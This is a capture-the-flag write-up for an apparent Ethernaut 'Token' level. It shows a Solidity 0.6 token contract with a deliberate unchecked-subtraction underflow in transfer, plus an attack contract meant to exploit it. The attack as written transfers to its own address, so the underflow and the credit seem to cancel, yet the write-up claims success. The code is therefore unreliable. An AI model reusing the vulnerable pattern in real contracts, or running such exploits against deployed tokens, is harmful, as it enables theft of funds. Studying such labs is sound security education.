# Challenge 5 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

Challenge
---
> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Solution
--- 
1. If you look at the contract You will see the 3 function `constructor`, `transfer` and `balanceOf`. `constructor` will the set the whoever deploys the contract. `transfer` takes `address` of the `recepient` and `value` and `balanceOf` will returns the how may token owner owns. 

2. `transfer` function is vulnerable that is overflow/undeflow.

Here's the gotcha my fellow friend,
> < 0.8.0 no checks for the overlow/undeflow without any errors.

> Default behaviour of Solidity 0.8.0 or higher version for overflow / underflow is to throw an error.

Here's The code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TokenAttack {
    Token tokenAddress;

    constructor(address _addr) public  {
        tokenAddress = Token(_addr);
    }

    function solveTransfer() public returns(bool) {
        bool result = tokenAddress.transfer(address(this),21000001);
        return result;
    }
}
```

If You want to learn OverFlow/Undeflow Here's the [link.](https://ethereum-blockchain-developer.com/010-solidity-basics/03-integer-overflow-underflow/)

Make New Contract and create `solveTransfer` provide address and value that will do overflow/undeflow. now you can submit the instance and you will see your console with completed level message.